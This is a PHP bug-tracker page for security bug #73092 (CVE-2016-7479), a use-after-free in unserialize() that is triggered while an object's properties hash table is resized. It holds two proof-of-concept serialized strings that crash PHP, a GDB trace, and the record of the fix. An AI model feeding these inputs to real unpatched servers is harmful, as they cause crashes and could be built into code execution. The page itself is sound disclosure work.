<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #73092 - RDF' href='rss/bug.php?id=73092'>
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #73092 - RSS 2.0' href='rss/bug.php?id=73092&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #73092 :: Unserialize use-after-free when resizing object's properties hash table</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=73092">Sec Bug</a>&nbsp;#73092</th>
            <td id="summary" colspan="5">Unserialize use-after-free when resizing object's properties hash table</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-09-15 15:24 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2017-01-16 11:47 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=nikic">nikic</a> (<a href="https://people.php.net/nikic">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.1.0RC1</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7479" target="_blank">2016-7479</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=73092&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=73092&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=73092&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1473953048">&nbsp;</a><strong>[2016-09-15 15:24 UTC] yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
Description:
------------
During unserialization, resizing the 'properties' hash table of a serialized object may lead to use-after-free.
A remote attacker may exploit this bug to gain arbitrary code execution.

When unserializing objects, the unserialized properties of the object are created and saved in it's 'properties' hash table. The address of these properties are saved in the 'var_hash' struct, for support in future references to them.
However, if properties are added to this hash table during unserialization, the underlying implementation of the hash table may need to re-allocate it's arData (values) array. In the process of re-allocation, the old arData is freed and returned to the allocator and bigger array is allocated. This reult in pointers in 'var_hash' pointing to the freed memory which is now ready for allocation.

This issue is somewhat related to #70211.

There are (at least) two ways to trigger this behavior:
1. Creating a new property of an object in a function which is called during unserialization.
For example: __wakeup method is a perfect candidate.
PoC:
----
&lt;?php

class foo {

    function __wakeup() {
        $this-&gt;{'x'} = 1;
    }
}

unserialize('a:3:{i:0;O:3:&quot;foo&quot;:8:{i:0;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;i:7;i:7;}i:1;s:263:&quot;'.str_repeat(&quot;\06&quot;, 263).'&quot;;i:2;r:3;}');

expected result: script terminates successfully.
result: segmentation fault.


2. Invoking the unserlying 'get_properties' method of 'DateInterval' object.
This method updates the properties hash table of this object and may add new values to it (ext/date/php_date.c line 2349 in commit 01e798fa360bcd89980d1946503a8e0f8a2fd357).
Since many functions use the underlying 'get_properties' method of an object, it is quite likely to find a way to trigger this bug in real-world projects.

PoC:
----
&lt;?php
class foo {
    public $x;
    function __wakeup() {
        var_dump($this-&gt;x);
    }
}

unserialize('a:3:{i:0;O:3:&quot;foo&quot;:1:{s:1:&quot;x&quot;;O:12:&quot;DateInterval&quot;:1:{i:0;i:0;}}i:1;s:263:&quot;'.str_repeat(&quot;\06&quot;, 263).'&quot;;i:2;r:4;}}');

expected result: script terminates successfully.
result: segmentation fault.


GDB (of PoC1):
--------------
(gdb) b object_common2
Breakpoint 1 at 0x7cbf6c: file ext/standard/var_unserializer.re, line 505.
(gdb) r crash.php
Starting program: /home/yannayl/sources/php-src/sapi/cli/php crash.php

Breakpoint 1, object_common2 (rval=0x7ffff445b7a0, p=0x7fffffff9f98, max=0x7ffff447a18c &quot;&quot;, var_hash=0x7fffffff9fa0, elements=8) at ext/standard/var_unserializer.re:505
505 {
(gdb) b 529
Breakpoint 2 at 0x7cc893: file ext/standard/var_unserializer.re, line 529.
(gdb) c
Continuing.

Breakpoint 2, object_common2 (rval=0x7ffff445b7a0, p=0x7fffffff9f98, max=0x7ffff447a18c &quot;&quot;, var_hash=0x7fffffff9fa0, elements=8) at ext/standard/var_unserializer.re:529
529     if (has_wakeup) {
(gdb) p *ht
$1 = {gc = {refcount = 1, u = {v = {type = 7 '\a', flags = 0 '\000', gc_info = 0}, type_info = 7}}, u = {v = {flags = 10 '\n', nApplyCount = 0 '\000', nIteratorsCount = 0 '\000', reserve = 0 '\000'}, 
    flags = 10}, nTableMask = 4294967288, arData = 0x7ffff445b8e0, nNumUsed = 8, nNumOfElements = 8, nTableSize = 8, nInternalPointer = 0, nNextFreeElement = 0, pDestructor = 0x895448 &lt;_zval_ptr_dtor&gt;}
(gdb) p &amp;ht-&gt;arData
$2 = (Bucket **) 0x7ffff4455320
(gdb) watch *0x7ffff4455320
Hardware watchpoint 3: *0x7ffff4455320
(gdb) c
Continuing.

Hardware watchpoint 3: *0x7ffff4455320

Old value = -196757280
New value = -196730816
zend_hash_do_resize (ht=0x7ffff4455310) at /home/yannayl/sources/php-src/Zend/zend_hash.c:868
868         memcpy(ht-&gt;arData, old_buckets, sizeof(Bucket) * ht-&gt;nNumUsed);
(gdb) n
869         pefree(old_data, ht-&gt;u.flags &amp; HASH_FLAG_PERSISTENT);
(gdb) p old_data
$3 = (void *) 0x7ffff445b8c0
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000007ce466 in php_var_unserialize_internal (rval=0x7ffff445b7e0, p=0x7fffffff9f98, max=0x7ffff447a18c &quot;&quot;, var_hash=0x7fffffff9fa0) at ext/standard/var_unserializer.re:643
643     ZVAL_COPY(rval, rval_ref);
(gdb) p rval_ref
$4 = (zval *) 0x7ffff445b8e0
(gdb) p *rval_ref
$5 = {value = {lval = 434041037028460038, dval = 1.2132797677859895e-279, counted = 0x606060606060606, str = 0x606060606060606, arr = 0x606060606060606, obj = 0x606060606060606, res = 0x606060606060606, 
    ref = 0x606060606060606, ast = 0x606060606060606, zv = 0x606060606060606, ptr = 0x606060606060606, ce = 0x606060606060606, func = 0x606060606060606, ww = {w1 = 101058054, w2 = 101058054}}, u1 = {
    v = {type = 6 '\006', type_flags = 6 '\006', const_flags = 6 '\006', reserved = 6 '\006'}, type_info = 101058054}, u2 = {next = 101058054, cache_slot = 101058054, lineno = 101058054, 
    num_args = 101058054, fe_pos = 101058054, fe_iter_idx = 101058054, access_flags = 101058054, property_guard = 101058054}}
(gdb) p *(var_entries *)var_hash-&gt;first
$6 = {data = {0x7fffffffa150, 0x7ffff445b7a0, 0x7ffff445b8e0, 0x7ffff445b900, 0x7ffff445b920, 0x7ffff445b940, 0x7ffff445b960, 0x7ffff445b980, 0x7ffff445b9a0, 0x7ffff445b9c0, 0x7ffff445b7c0, 
    0x7ffff445b7e0, 0x0 &lt;repeats 1012 times&gt;}, used_slots = 12, next = 0x0}




</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=73092'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=73092'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1477909388">&nbsp;</a><strong>[2016-10-31 10:23 UTC] yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</strong>
<pre class='note'>Assigned CVE: CVE-2016-7479
Please associate it with this bug.
</pre>
</div><div class='comment type_log' ><a name="1483088211">&nbsp;</a><strong>[2016-12-30 08:56 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2016-7479</span>
</div></div></div><div class='comment type_log' ><a name="1484567246">&nbsp;</a><strong>[2017-01-16 11:47 UTC] <a href="//people.php.net/nikic">nikic@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Closed</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: nikic</span>
</div></div></div><div class='comment type_comment' ><a name="1484567246">&nbsp;</a><strong>[2017-01-16 11:47 UTC] <a href="//people.php.net/nikic">nikic@php.net</a></strong>
<pre class='note'>This has been fixed by <a href="https://github.com/php/php-src/commit/0426b916df396a23e5c34514e4f2f0627efdcdf0" rel="nofollow">https://github.com/php/php-src/commit/0426b916df396a23e5c34514e4f2f0627efdcdf0</a>. Note that this is effectively a duplicate of <a href='bug.php?id=72610'>bug #72610</a>. I'm not marking it as a duplicate as this bug has simpler reproduce cases where the security impact is clearer.
</pre>
</div><div class='comment type_related' ><a name="1496328197">&nbsp;</a><strong>[2017-06-01 14:43 UTC] <a href="//people.php.net/nikic">nikic@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=74687'>Bug #74687</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
